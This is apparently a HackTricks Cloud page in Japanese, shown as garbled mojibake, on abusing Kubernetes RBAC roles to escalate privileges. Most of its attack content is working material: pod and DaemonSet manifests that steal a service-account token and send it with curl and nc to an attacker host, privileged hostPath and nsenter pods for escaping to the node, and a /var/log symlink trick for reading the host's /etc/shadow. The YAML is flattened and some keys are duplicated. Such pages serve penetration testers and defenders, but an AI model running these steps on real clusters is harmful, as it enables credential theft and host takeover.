# Kubernetesã«ãŠã‘ã‚‹Roles/ClusterRolesã®æ‚ªç”¨

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

ã“ã“ã§ã¯ã€æ½œåœ¨çš„ã«å±é™ºãªRolesãŠã‚ˆã³ClusterRolesã®æ§‹æˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`kubectl api-resources`ã‚’ä½¿ç”¨ã—ã¦ã€ã™ã¹ã¦ã®ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ã€‚

## **ç‰¹æ¨©æ˜‡æ ¼**

**ç•°ãªã‚‹ç‰¹æ¨©ã‚’æŒã¤åˆ¥ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æŠ€è¡“**ã‚’æŒ‡ã—ã¾ã™ï¼ˆKubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã€‚Kubernetesã«ã¯ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã®åŸºæœ¬çš„ã«**4ã¤ã®ä¸»è¦ãªæŠ€è¡“**ãŒã‚ã‚Šã¾ã™ï¼š

* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šè‰¯ã„ç‰¹æ¨©ã‚’æŒã¤ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/ã‚°ãƒ«ãƒ¼ãƒ—/SAã‚’**ãªã‚Šã™ã¾ã™**ã“ã¨ãŒã§ãã‚‹
* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šè‰¯ã„ç‰¹æ¨©ã‚’æŒã¤SAã‚’**è¦‹ã¤ã‘ãŸã‚Šã€ã‚¢ã‚¿ãƒƒãƒã—ãŸã‚Šã™ã‚‹**ã“ã¨ãŒã§ãã‚‹**ãƒãƒƒãƒ‰ã‚’ä½œæˆ/ãƒ‘ãƒƒãƒ/å®Ÿè¡Œã™ã‚‹**
* SAãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã‚€**ã“ã¨ãŒã§ãã‚‹
* ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã«**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹**ã“ã¨ãŒã§ãã€ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã€ãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã€ãŠã‚ˆã³ãƒãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¯ãƒ©ã‚¦ãƒ‰å†…ã§ã®ãƒãƒ¼ãƒ‰ã®æ¨©é™ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã‚‹ï¼ˆã‚ã‚‹å ´åˆï¼‰
* è¨€åŠã«å€¤ã™ã‚‹5ç•ªç›®ã®æŠ€è¡“ã¯ã€ãƒãƒƒãƒ‰å†…ã§**ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**èƒ½åŠ›ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãã®ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã¾ãŸã¯å‹•è©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ï¼‰

**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ï¼ˆ*ï¼‰ã¯ã€ä»»æ„ã®å‹•è©ã‚’æŒã¤ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹æ¨©é™ã‚’ä¸ãˆã¾ã™**ã€‚ã“ã‚Œã¯ç®¡ç†è€…ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ClusterRoleå†…ã§ã¯ã€æ”»æ’ƒè€…ãŒã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ä»»æ„ã®namespaceã‚’æ‚ªç”¨ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### ç‰¹å®šã®å‹•è©ã§ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹

RBACã§ã¯ã€ç‰¹å®šã®æ¨©é™ãŒé‡å¤§ãªãƒªã‚¹ã‚¯ã‚’ã‚‚ãŸã‚‰ã—ã¾ã™ï¼š

1. **`create`:** ä»»æ„ã®ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆã™ã‚‹èƒ½åŠ›ã‚’ä»˜ä¸ã—ã€ç‰¹æ¨©æ˜‡æ ¼ã®ãƒªã‚¹ã‚¯ã‚’ä¼´ã„ã¾ã™ã€‚
2. **`list`:** ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ä¸€è¦§è¡¨ç¤ºã§ãã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **`get`:** ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„…å¨ã‚’ã‚‚ãŸã‚‰ã—ã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ç‰¹æ¨©ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ãƒãƒƒãƒ‰ã«ã‚¢ã‚¿ãƒƒãƒã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚“ã§ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å½è£…ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å®Ÿè³ªçš„ã«æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

`bootstrap-signer`ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€æ”»æ’ƒè€…ã«é€ä¿¡ã™ã‚‹ãƒãƒƒãƒ‰ã®ä¾‹:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Podã®ä½œæˆã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—

ä»¥ä¸‹ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠãŒæŒã¤ã“ã¨ãŒã§ãã‚‹ã™ã¹ã¦ã®æ¨©é™ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

* **ç‰¹æ¨©ã‚¢ã‚¯ã‚»ã‚¹**ï¼ˆä¿è­·ã‚’ç„¡åŠ¹ã«ã—ã€èƒ½åŠ›ã‚’è¨­å®šã™ã‚‹ï¼‰
* **namespace hostIPCãŠã‚ˆã³hostPidã‚’ç„¡åŠ¹ã«ã™ã‚‹** ã“ã‚Œã«ã‚ˆã‚Šæ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™
* **hostNetwork** namespaceã‚’ç„¡åŠ¹ã«ã—ã€ãƒãƒ¼ãƒ‰ã®ã‚¯ãƒ©ã‚¦ãƒ‰æ¨©é™ã‚’ç›—ã‚€ãŸã‚ã®ã‚¢ã‚¯ã‚»ã‚¹ã¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚ˆã‚Šè‰¯ã„ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™
* **ãƒ›ã‚¹ãƒˆã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ / ã‚³ãƒ³ãƒ†ãƒŠå†…ã«**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ã«ã¯:
```bash
kubectl --token $token create -f mount_root.yaml
```
ã“ã®ãƒ„ã‚¤ãƒ¼ãƒˆã‹ã‚‰ã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨ã„ãã¤ã‹ã®è¿½åŠ :
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ä»Šã€ãƒãƒ¼ãƒ‰ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã§ãã‚‹ã‚ˆã†ã«ãªã£ãŸã®ã§ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆæŠ€è¡“ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

#### ã‚¹ãƒ†ãƒ«ã‚¹

ãŠãã‚‰ãã€ã‚ãªãŸã¯**ã‚¹ãƒ†ãƒ«ã‚¹æ€§**ã‚’é«˜ã‚ãŸã„ã¨æ€ã£ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€å‰ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§è¨€åŠã•ã‚ŒãŸç‰¹æ¨©ã®ä¸€éƒ¨ã®ã¿ã‚’æœ‰åŠ¹ã«ã—ã¦ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ãŸå ´åˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚‚ã®ã‚’ç¢ºèªã§ãã¾ã™ï¼š

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_å‰ã®ç‰¹æ¨©ãƒãƒƒãƒ‰æ§‹æˆã‚’ä½œæˆ/æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã®ä¾‹ã¯_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚_

### ãƒãƒƒãƒ‰ä½œæˆ - ã‚¯ãƒ©ã‚¦ãƒ‰ã«ç§»å‹•

**ãƒãƒƒãƒ‰**ï¼ˆãŠã‚ˆã³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’**ä½œæˆ**ã§ãã‚‹å ´åˆã€**ãƒãƒƒãƒ‰ã¾ãŸã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒã§ç‰¹æ¨©ã‚’å–å¾—**ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã—ã¦ã€ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚\
ã•ã‚‰ã«ã€**ãƒ›ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åå‰ç©ºé–“**ã‚’æŒã¤**ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã§ãã‚‹å ´åˆã€**ãƒãƒ¼ãƒ‰**ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®IAMãƒ­ãƒ¼ãƒ«ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ãƒ«ã‚»ãƒƒãƒˆã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã€ãƒ¬ãƒ—ãƒªã‚«ã‚»ãƒƒãƒˆã€ã‚¸ãƒ§ãƒ–ã€ã‚¯ãƒ­ãƒ³ã‚¸ãƒ§ãƒ–ã®ä½œæˆ/ãƒ‘ãƒƒãƒ**

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€**æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã€å‰ã®ä¾‹ã®ã‚ˆã†ã«ç‰¹æ¨©ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ä»¥ä¸‹ã®yamlã¯ã€**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã‚’ä½œæˆã—ã€ãƒãƒƒãƒ‰å†…ã®SAã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã¾ã™**ï¼š
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ã¯ã€**ãƒãƒƒãƒ‰å†…ã®ã‚·ã‚§ãƒ«ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹kubernetesã®ãƒªã‚½ãƒ¼ã‚¹**ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ã‚·ã‚§ãƒ«ã«å…¥ã£ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€**ãƒãƒƒãƒ‰ã«å…¥ã£ã¦SAã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚Šã€ç‰¹æ¨©ãƒãƒƒãƒ‰ã«å…¥ã£ã¦ãƒãƒ¼ãƒ‰ã«è„±å‡ºã—ã€ãƒãƒ¼ãƒ‰å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚“ã§ãƒãƒ¼ãƒ‰ã‚’(æ‚ªç”¨)ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

ã“ã®æ¨©é™ã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒ‰å†…ã®1ã¤ã®ãƒãƒ¼ãƒˆã«1ã¤ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒ¼ãƒˆã‚’è»¢é€ã™ã‚‹**ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒãƒƒãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç°¡å˜ã«ãƒ‡ãƒãƒƒã‚°ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ãŒã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãªã©ï¼‰ã¾ãŸã¯è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆã‚¦ã‚§ãƒ–ï¼Ÿï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
kubectl port-forward pod/mypod 5000:5000
```
### ãƒ›ã‚¹ãƒˆã®æ›¸ãè¾¼ã¿å¯èƒ½ãª /var/log/ ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—

[**ã“ã®ç ”ç©¶ã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã€**ãƒ›ã‚¹ãƒˆã® `/var/log/` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸãƒãƒƒãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã¾ãŸã¯ä½œæˆã§ãã‚‹å ´åˆ**ã€**ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚\
ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€**Kube-APIãŒã‚³ãƒ³ãƒ†ãƒŠã®ãƒ­ã‚°ã‚’å–å¾—ã—ã‚ˆã†ã¨ã™ã‚‹éš›**ï¼ˆ`kubectl logs <pod>`ã‚’ä½¿ç”¨ï¼‰ã€**ãƒãƒƒãƒ‰ã® `0.log`** ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ **Kubelet** ã‚µãƒ¼ãƒ“ã‚¹ã® `/logs/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã‚ã§ã™ã€‚\
Kubeletã‚µãƒ¼ãƒ“ã‚¹ã¯ `/logs/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€ã“ã‚Œã¯åŸºæœ¬çš„ã« **ã‚³ãƒ³ãƒ†ãƒŠã® `/var/log` ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’å…¬é–‹ã—ã¦ã„ã‚‹**ã ã‘ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€**ã‚³ãƒ³ãƒ†ãƒŠã® /var/log/ ãƒ•ã‚©ãƒ«ãƒ€ã«æ›¸ãè¾¼ã‚€ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤æ”»æ’ƒè€…**ã¯ã€ã“ã®å‹•ä½œã‚’2ã¤ã®æ–¹æ³•ã§æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* ã‚³ãƒ³ãƒ†ãƒŠã® `0.log` ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆé€šå¸¸ã¯ `/var/logs/pods/namespace_pod_uid/container/0.log` ã«ã‚ã‚Šã¾ã™ï¼‰ã‚’ **`/etc/shadow` ã‚’æŒ‡ã™ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯**ã«å¤‰æ›´ã—ã¾ã™ã€‚ãã†ã™ã‚Œã°ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¦ãƒ›ã‚¹ãƒˆã®ã‚·ãƒ£ãƒ‰ã‚¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* æ”»æ’ƒè€…ãŒ **`nodes/log`** ã‚’èª­ã‚€æ¨©é™ã‚’æŒã¤ä»»æ„ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹å ´åˆã€å½¼ã¯å˜ã« `/host-mounted/var/log/sym` ã« **ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯** ã‚’ä½œæˆã—ã€**`https://<gateway>:10250/logs/sym/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ãƒ›ã‚¹ãƒˆã®ãƒ«ãƒ¼ãƒˆ** ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒªã‚¹ãƒˆè¡¨ç¤ºã—ã¾ã™ï¼ˆã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å®Ÿé¨“å®¤ã¨è‡ªå‹•åŒ–ã•ã‚ŒãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**

#### èª­ã¿å–ã‚Šå°‚ç”¨ä¿è­·ã®å›é¿ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

é‹ãŒè‰¯ã‘ã‚Œã°ã€é«˜åº¦ãªç‰¹æ¨©ã‚’æŒã¤èƒ½åŠ› `CAP_SYS_ADMIN` ãŒåˆ©ç”¨å¯èƒ½ã§ã‚ã‚Œã°ã€ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚’rwã¨ã—ã¦å†ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

